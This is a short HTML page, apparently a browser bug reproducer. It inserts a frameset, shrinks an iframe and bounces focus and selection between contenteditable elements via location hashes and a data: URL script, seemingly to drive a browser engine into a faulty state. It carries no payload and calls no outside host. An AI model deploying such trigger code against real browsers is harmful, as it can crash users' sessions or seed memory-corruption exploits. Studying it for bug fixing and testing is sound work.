<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<style>
  iframe {
    content: url();
    zoom: 0.01;
  }
</style>
</head>
<body>

<div id="x" contenteditable="true">X</div>
<div id="y" contenteditable="true">Y</div>
<iframe id="i0"></iframe>

<script>
  window.addEventListener('load', () => {
    // 1. Inserção do frameset
    document.documentElement.append(document.createElement('frameset'));

    const i0 = document.getElementById('i0');

    // 2. Ao focar, altera para a segunda âncora e força o cursor/seleção
    i0.onfocus = () => {
      location.hash = 'y';

      // Força a engine a processar seleção/caret manualmente
      const yElem = document.getElementById('y');
      if (yElem) {
        const range = document.createRange();
        range.selectNodeContents(yElem);
        const sel = window.getSelection();
        sel.removeAllRanges();
        sel.addRange(range);
      }
    };

    // 3. Primeira âncora
    location.hash = 'x';

    // 4. Disparo do script assíncrono mantendo a ordem original
    let s0 = document.createElement('script');
    s0.src = `data:text/javascript,if(window.caches){caches.has('a').then(()=>i0.focus());}else{setTimeout(()=>i0.focus(),0);}`;
    document.head.append(s0);
  });
</script>
</body>
</html>
